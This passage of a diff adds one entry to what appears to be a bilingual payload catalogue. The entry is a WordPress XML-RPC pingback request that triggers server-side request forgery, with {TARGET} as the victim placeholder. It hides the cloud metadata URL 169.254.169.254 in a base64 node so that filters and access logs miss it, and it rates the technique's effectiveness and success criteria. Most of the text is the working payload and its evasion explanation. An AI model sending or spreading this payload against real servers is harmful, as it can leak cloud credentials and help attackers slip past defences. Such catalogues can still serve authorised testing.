+      "id": "ssti2-xml-rpc-ssrf",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 4,
+          "expectedCommand": "<?xml version=\"1.0\"?><methodCall><methodName>pingback.ping</methodName> \n <params><param><value><string>http:&#47;&#47;127.0.0.1:8080&#47;</string></value></param> \n <param><value><string>http://{TARGET}/</string></value></param></params></methodCall>",
+          "command": "<?xml version=\"1.0\" encoding=\"utf-8\"?> \n <methodCall><methodName>pingback.ping</methodName> \n <params><param><value><base64>aHR0cDovLzE2OS4yNTQuMTY5LjI1NC9sYXRlc3QvbWV0YS1kYXRhLw==</base64></value></param> <param><value><string>http://{TARGET}/</string></value></param></params> \n </methodCall>",
+          "title": {
+            "zh": "Base64 编码云元数据目标",
+            "en": "Base64-Encoded Metadata Target"
+          },
+          "description": {
+            "zh": "URL 以 base64 节点传输，字面过滤与访问日志看不到明文目标，此处指向 169.254.169.254 云元数据端点。边界：需 XML-RPC 层把 base64 节点解码为字符串再交给 pingback 处理器，未实现该解码的目标上此形无效。成功判据：目标侧向元数据端点发起请求，或 OAST 记录到相应回连。",
+            "en": "The URL rides in a base64 node, so literal filters and access logs never see the plaintext target, here the 169.254.169.254 cloud metadata endpoint. Boundary: the XML-RPC layer must decode the base64 node into a string before handing it to the pingback handler; on targets without that decoding this form is inert. Success: the target issues a request toward the metadata endpoint, or the collector records the corresponding callback."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "<base64>aHR0cDovLzE2OS4yNTQuMTY5LjI1NC9sYXRlc3QvbWV0YS1kYXRhLw==</base64>",
+              "explanation": {
+                "zh": "base64 节点承载明文目标，解码后为 http://169.254.169.254/latest/meta-data/",
+                "en": "base64 node carries the plaintext target, decoding to the metadata URL"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "pingback.ping",
+              "explanation": {
+                "zh": "WordPress XML-RPC 回调方法发起服务端请求",
+                "en": "pingback method drives the server-side request"
+              },
+              "type": "keyword"
+            }
+          ],
+          "kind": "bypass",
+          "effectiveness": "B"
+        }
+      ]
+    }
+  ]
+}
